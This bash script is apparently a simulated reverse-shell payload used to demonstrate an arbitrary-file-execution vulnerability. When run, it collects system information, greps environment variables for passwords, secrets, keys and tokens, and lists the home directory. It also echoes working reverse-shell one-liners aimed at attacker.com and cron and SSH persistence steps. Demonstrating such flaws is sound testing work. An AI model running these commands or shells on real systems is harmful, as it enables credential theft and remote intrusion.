#!/bin/bash
# Simulated Reverse Shell Script - FOR SECURITY RESEARCH ONLY

echo "🚨 REVERSE SHELL PAYLOAD ACTIVATED 🚨"
echo "Timestamp: $(date)"
echo "User: $(whoami 2>/dev/null || echo 'unknown')"
echo "Working Directory: $(pwd 2>/dev/null || echo 'unknown')"

# Simulate system reconnaissance  
echo "=== SYSTEM INFORMATION ==="
echo "OS: $(uname -a 2>/dev/null || echo 'unknown')"
echo "Network interfaces: $(ifconfig 2>/dev/null || ip addr 2>/dev/null || echo 'unknown')"
echo "Running processes: $(ps aux 2>/dev/null | head -10 || echo 'unknown')"

# Simulate data collection
echo "=== SENSITIVE DATA COLLECTION ==="
echo "Environment variables:"
env 2>/dev/null | grep -E "(PASSWORD|SECRET|KEY|TOKEN)" || echo "No sensitive env vars found"

echo "Home directory contents:"
ls -la ~/ 2>/dev/null || echo "Cannot access home directory"

# Simulate network communication
echo "=== ESTABLISHING REVERSE CONNECTION ==="
echo "Attempting to connect to attacker server..."

# Simulate different reverse shell techniques
echo "Method 1: Netcat reverse shell"
echo "nc -e /bin/bash attacker.com 4444"

echo "Method 2: Bash TCP reverse shell"
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

echo "Method 3: Python reverse shell"
echo "python -c 'import socket,subprocess; s=socket.socket(); s.connect((\"attacker.com\",4444)); subprocess.call([\"/bin/bash\"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())'"

# Simulate persistence mechanism
echo "=== ESTABLISHING PERSISTENCE ==="
echo "Creating cron job for persistence..."
echo "* * * * * /tmp/backdoor.sh" 

echo "Creating SSH backdoor..."
echo "Adding public key to authorized_keys"

echo "=== PAYLOAD EXECUTION COMPLETE ==="
echo "This demonstrates how uploaded shell scripts can:"
echo "- Execute system commands"
echo "- Gather sensitive information" 
echo "- Establish reverse connections"
echo "- Create persistent access"
echo ""
echo "🔥 CRITICAL VULNERABILITY: ARBITRARY FILE EXECUTION 🔥"